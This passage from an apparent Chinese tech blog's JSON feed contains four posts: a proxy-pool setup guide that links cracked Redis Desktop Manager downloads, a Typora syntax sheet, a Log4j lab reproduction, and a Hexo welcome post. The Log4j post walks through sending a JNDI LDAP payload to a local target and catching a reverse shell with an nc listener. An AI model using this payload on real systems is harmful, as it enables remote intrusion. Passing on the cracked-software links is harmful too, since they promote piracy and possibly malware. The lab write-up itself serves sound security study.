class=\"token number\">6379</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 指定配置文件运行 redis</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /usr/local/redis/bin</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>./redis-server /usr/local/redis.conf</pre></td></tr></table></figure><p>redis 开启后可以使用数据库管理工具进行连接，查看数据</p>\n<div class=\"note warning\">\n<p><strong>警告：破解版软件均为网络资源，请自行查杀！！！</strong></p>\n</div>\n<p>Mac 破解版下载<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uaWN1bHR1cmUuY2Mvcy9FRXd1WQ==\"> Redis Desktop Manager</span></p>\n<p>Windows 破解版下载<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uaWN1bHR1cmUuY2Mvcy9samtoYQ==\"> Redis Desktop Manager</span></p>\n<p>填写数据库信息进行连接，<ins class=\"dot\">云服务器的话注意开放端口</ins></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-28_22-19-48.jpg\" alt=\"2021-12-28_22-19-48\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-28_22-23-10.jpg\" alt=\"2021-12-28_22-23-10\" /></p>\n<h3 id=\"mac运行代理池脚本\"><a class=\"anchor\" href=\"#mac运行代理池脚本\">#</a> Mac 运行代理池脚本</h3>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 下载项目</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/jhao104/proxy_pool.git</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 安装依赖</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">cd</span> proxy_pool</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pip3 <span class=\"token function\">install</span> -r requirements.txt</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 修改配置文件 setting.py</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">vi</span> setting.py</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\"># 配置数据库</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tDB_CONN <span class=\"token operator\">=</span> <span class=\"token string\">'redis://:@192.168.50.199:6379/0'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 启动程序，分为: schedule 调度程序 和 server Api 服务，需两个终端</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\"># 终端 1，启动调度程序</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpython3 proxyPool.py schedule</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\"># 终端 2，启动 webApi 服务</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tpython3 proxyPool.py server</pre></td></tr></table></figure><p>schedule 调度程序从免费代理源获取 IP，此时查看 redis 数据库会看到获取的 IP 数据，server API 服务开启 api 接口，macOS 访问 http://127.0.0.1:5010/get 会随机从数据库中获取一条 IP 数据</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-28_22-38-57.jpg\" alt=\"2021-12-28_22-38-57\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-28_23-10-18.jpg\" alt=\"2021-12-28_23-10-18\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-28_22-38-58.jpg\" alt=\"2021-12-28_22-38-58\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-28_23-10-17.jpg\" alt=\"2021-12-28_23-10-17\" /></p>\n<h3 id=\"代理池的应用\"><a class=\"anchor\" href=\"#代理池的应用\">#</a> 代理池的应用</h3>\n<p>具体一个应用到代理池的项目可参考文章<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWN1bHR1cmUuY2MvZm9ydW0tcG9zdC82MDUz\">如何快速白嫖获得 CNVD 证书</span></p>\n<p>在代理池开启的情况下，Mac 新开终端运行项目<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhaWRlclpQ\"> RaiderZP</span>/<strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhaWRlclpQL2NudmRfZm9mYV9nYXRoZXI=\">cnvd_fofa_gather</span></strong>，脚本运行结束会得到 company.txt 文档</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 下载项目</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/RaiderZP/cnvd_fofa_gather</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 运行脚本</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">cd</span> cnvd_fofa_gather</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>python3 cnvd_fofa_gather.py</pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211230213214477.png\" alt=\"image-20211230213214477\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211230231735929.png\" alt=\"image-20211230231735929\" /></p>\n<p>祝大家搭建成功！</p>\n",
            "tags": [
                "代理池",
                "proxy_pool"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2021/12/19/Typora%E8%AF%AD%E6%B3%95/",
            "url": "https://mo-onstudy.com/2021/12/19/Typora%E8%AF%AD%E6%B3%95/",
            "title": "Typora语法",
            "date_published": "2021-12-19T14:49:37.000Z",
            "content_html": "<p><a href=\"https://typora.io\"><strong>Typora</strong></a> 是一款由 Abner Lee 开发的轻量级<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvTWFya2Rvd24=\"> Markdown</span> 编辑器，适用于 OS X、Windows 和 Linux 三种操作系统。与其他 Markdown 编辑器不同的是，Typora 没有采用源代码和预览双栏显示的方式，而是采用所见即所得的编辑方式，实现了即时预览的功能，但也可切换至源代码编辑模式。</p>\n<h1 id=\"标题\"><a class=\"anchor\" href=\"#标题\">#</a> 标题</h1>\n<p>一级标题： <code>#+space+text</code>  快捷键 Commend+number</p>\n<p>二级标题： <code>##+space+text</code></p>\n<p>三级标题： <code>###+space+text</code></p>\n<p>...</p>\n<p>最多六级</p>\n<h1 id=\"文本\"><a class=\"anchor\" href=\"#文本\">#</a> 文本</h1>\n<p><em>倾斜</em>： <code>*倾斜*</code>  快捷键 Commend+L</p>\n<p><strong>加粗</strong>： <code>**加粗**</code>  快捷键 Commend+B</p>\n<p><s>删除</s>： <code>~~删除~~</code>  快捷键 Commend+shift+`</p>\n<p>&lt;u&gt; 下划线 &lt;/u&gt;： <code>&lt;u&gt;下划线&lt;/u&gt;</code>  快捷键 Commend+U</p>\n<p><mark>高亮</mark>： <code>==高亮==</code></p>\n<p>图像： <code>![text](image url)</code></p>\n<h1 id=\"引用\"><a class=\"anchor\" href=\"#引用\">#</a> 引用</h1>\n<p>引用： <code>&gt;+space</code></p>\n<blockquote>\n<p>&quot;JOJO，我不做人啦！&quot;</p>\n</blockquote>\n<h1 id=\"列表\"><a class=\"anchor\" href=\"#列表\">#</a> 列表</h1>\n<p>4.1 无序列表： <code>+/-/*</code></p>\n<ul>\n<li>无</li>\n<li>序</li>\n<li>列</li>\n<li>表</li>\n</ul>\n<p>4.2 有序列表： <code>number+.+space+text</code></p>\n<ol>\n<li>有</li>\n<li>序</li>\n<li>列</li>\n<li>表</li>\n</ol>\n<p>4.3 任务列表： <code>-+space+[space]+text</code></p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\"> 任</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" disabled=\"true\" /><label for=\"cbx_1\"> 务</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_2\" disabled=\"true\" /><label for=\"cbx_2\"> 列</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_3\" disabled=\"true\" /><label for=\"cbx_3\"> 表</label></li>\n</ul>\n<h1 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h1>\n<p>单行：`` 中间写 code</p>\n<p>单行 <code>code</code></p>\n<p>多行：```+python+Enter</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>多行</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string backtick-quoted-string\">``</span>`<span class=\"token operator\">+</span>Enter</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><h1 id=\"超链接\"><a class=\"anchor\" href=\"#超链接\">#</a> 超链接</h1>\n<p>6.1 网址： <code>[文本]+(url)</code>  快捷键 Commend+K</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29nbGUuY29t\">Google</span></p>\n<p>6.2 本地： <code>[文本]+(url)</code>  快捷键 Commend+K</p>\n<p><a href=\"/Users/Documents/image/1.jpeg\">本地</a></p>\n<h1 id=\"注释\"><a class=\"anchor\" href=\"#注释\">#</a> 注释</h1>\n<p>注释<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>： <code>text[^number]</code></p>\n<p>注解： <code>[^number]:</code></p>\n<h1 id=\"分割线\"><a class=\"anchor\" href=\"#分割线\">#</a> 分割线</h1>\n<p>分割线： <code>---+Enter</code></p>\n<p>语法：&lt;hr&gt; 文本 &lt;/hr&gt;</p>\n<p>&lt;hr&gt; 分割线 &lt;/hr&gt;</p>\n<p>&lt;hr&gt;&lt;/hr&gt;</p>\n<hr />\n<h1 id=\"上下标\"><a class=\"anchor\" href=\"#上下标\">#</a> 上下标</h1>\n<p>上<sup>标</sup>： <code>上^标^</code></p>\n<p>下<sub>标</sub>： <code>下~标~</code></p>\n<h1 id=\"表格\"><a class=\"anchor\" href=\"#表格\">#</a> 表格</h1>\n<p>快捷键 Commend+Alt+T</p>\n<h1 id=\"公式\"><a class=\"anchor\" href=\"#公式\">#</a> 公式</h1>\n<p>公式： <code>$公式$</code></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><msup><mi>e</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">f(x)=e^2+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></p>\n<h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<p>&lt;button&gt; 按钮 &lt;/button&gt;： <code>&lt;button&gt;按钮&lt;/button&gt;</code></p>\n<p>emoji： <code>:emoji:</code></p>\n<p>太🐶了</p>\n<p>你懂个🔨</p>\n<p>生成目录： <code>[toc]</code></p>\n<hr class=\"footnotes-sep\" />\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p><em>注释：注释与注解</em> <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "typora"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2021/12/19/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://mo-onstudy.com/2021/12/19/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "Log4j漏洞复现",
            "date_published": "2021-12-19T14:36:41.000Z",
            "content_html": "<h1 id=\"log4j漏洞复现\"><a class=\"anchor\" href=\"#log4j漏洞复现\">#</a> Log4j 漏洞复现</h1>\n<h2 id=\"漏洞复现环境介绍\"><a class=\"anchor\" href=\"#漏洞复现环境介绍\">#</a> 漏洞复现环境介绍</h2>\n<p>局域网</p>\n<p>攻击机器：MacOS BigSur</p>\n<p>攻击 IP：192.168.1.9</p>\n<p>目标机器：Centos7</p>\n<p>目标 IP：192.168.1.16</p>\n<h2 id=\"前期准备\"><a class=\"anchor\" href=\"#前期准备\">#</a> 前期准备</h2>\n<h3 id=\"目标机器安装docker\"><a class=\"anchor\" href=\"#目标机器安装docker\">#</a> 目标机器安装 Docker</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>Centos7安装Docker</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzAxNDUx\">参考链接</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#更新 yum 包</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum -y update </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#卸载旧版本（如果之前安装过的话） </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>yum remove docker docker-common docker-selinux docker-engine </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#安装需要的软件包 </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>yum <span class=\"token function\">install</span> -y yum-utils device-mapper-persistent-data lvm2 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#设置 yum 源 </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>yum-config-manager --add-repo http://download.docker.com/linux/centos/docker-ce.repo（中央仓库） </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo（阿里仓库） </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#查看可用版本 </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>yum list docker-ce --showduplicates <span class=\"token operator\">|</span> <span class=\"token function\">sort</span> -r </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#安装 docker </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>yum -y <span class=\"token function\">install</span> docker-ce-18.03.1.ce</pre></td></tr></table></figure><p>附一些 docker 常用命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>Docker常用命令</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#启动 docker 服务           </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>systemctl start docker</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#重启 docker 服务   </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>systemctl restart  docker</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#关闭 docker 服务   </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>systemctl stop docker</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#镜像搭建容器</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>docker run -dt --name <span class=\"token string\">'自定义容器名称'</span> -p <span class=\"token number\">80</span>:80 --rm <span class=\"token string\">'镜像名称'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#查看所有容器</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>docker <span class=\"token function\">ps</span> -a    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#进入容器</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>docker <span class=\"token builtin class-name\">exec</span> -it 容器ID /bin/bash    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>docker <span class=\"token builtin class-name\">exec</span> -it 容器ID /bin/sh   </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#开启容器</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>docker start 容器ID    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#停止容器</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>docker stop 容器ID       </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#删除容器</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>docker <span class=\"token function\">rm</span> 容器ID         </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#删除镜像</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>docker rmi 容器ID</pre></td></tr></table></figure><h3 id=\"目标机器搭建漏洞靶场\"><a class=\"anchor\" href=\"#目标机器搭建漏洞靶场\">#</a> 目标机器搭建漏洞靶场</h3>\n<p>参照<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYzMTMy\"> Log4J 漏洞复现 + 漏洞靶场</span>，依次执行命令。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>docker搭建靶场环境</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#拉取 docker 镜像</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#根据镜像搭建容器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>docker run -it -d -p <span class=\"token number\">8080</span>:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#进入容器</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>docker <span class=\"token builtin class-name\">exec</span> -it log4j_vuln_container /bin/bash</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#运行 apache 服务</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</pre></td></tr></table></figure><p>访问漏洞靶场地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS4xNjo4MDgwL3dlYnN0dWR5Lw==\">http://192.168.1.16:8080/webstudy/</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-33-02%20(1).jpg\" alt=\"2021-12-17_14-33-02 (1)\" /></p>\n<h3 id=\"攻击机器下载配置poc\"><a class=\"anchor\" href=\"#攻击机器下载配置poc\">#</a> 攻击机器下载配置 poc</h3>\n<p>下载 poc 项目：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvem1lcg==\">kozmer</span>/<strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvem1lci9sb2c0ai1zaGVsbC1wb2M=\">log4j-shell-poc</span></strong></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-33-02%20(2).jpg\" alt=\"2021-12-17_14-33-02 (2)\" /></p>\n<p>安装 poc.py 运行所需 python 包</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip3 <span class=\"token function\">install</span> colorama</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pip3 <span class=\"token function\">install</span> argparse</pre></td></tr></table></figure><p>poc.py 运行需调用 Java1.8，已安装 JDK 的情况下，修改 poc.py 中 Java_Home 路径为本地路径</p>\n<div class=\"note info\">\n<p>poc 项目已被更新，实际脚本代码与本文截图会略有不同</p>\n</div>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-58-26.jpg\" alt=\"2021-12-17_14-58-26\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-48-44.jpg\" alt=\"2021-12-17_14-48-44\" /></p>\n<h2 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 漏洞复现</h2>\n<p>目标机器：已运行漏洞靶场环境</p>\n<p>攻击机器：运行 poc.py 脚本，并新开启一个终端设置监听，这里攻击 IP 为 192.168.1.9，http 服务端口为 8000，反弹 shell（监听）端口为 9001</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>运行poc.py</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#运行 poc.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3 poc.py --userip <span class=\"token number\">192.168</span>.1.9 --webport <span class=\"token number\">8000</span> --lport <span class=\"token number\">9001</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#新开 shell 窗口并设置监听</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">nc</span> -lvn <span class=\"token number\">9001</span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_17-32-03%20(1).jpg\" alt=\"2021-12-17_17-32-03 (1)\" /></p>\n<p>访问 http://192.168.1.16:8080/webstudy/，点击 hit me 提示我们用 post 请求，使用 hackbar 来发送 post 请求，这里漏洞靶场的 post 请求参数为 c，我们发送 <code>c=$&#123;jndi:ldap://192.168.1.9:1389/a&#125;</code></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_17-32-03%20(3).jpg\" alt=\"2021-12-17_17-32-03 (3)\" /></p>\n<p>查看监听，成功反弹 shell</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_17-32-03%20(4).jpg\" alt=\"2021-12-17_17-32-03 (4)\" /></p>\n<p>希望大家复现成功！</p>\n",
            "tags": [
                "Log4j"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2021/12/19/hello-world/",
            "url": "https://mo-onstudy.com/2021/12/19/hello-world/",
            "title": "Hello World",
            "date_published": "2021-12-19T13:25:10.000Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}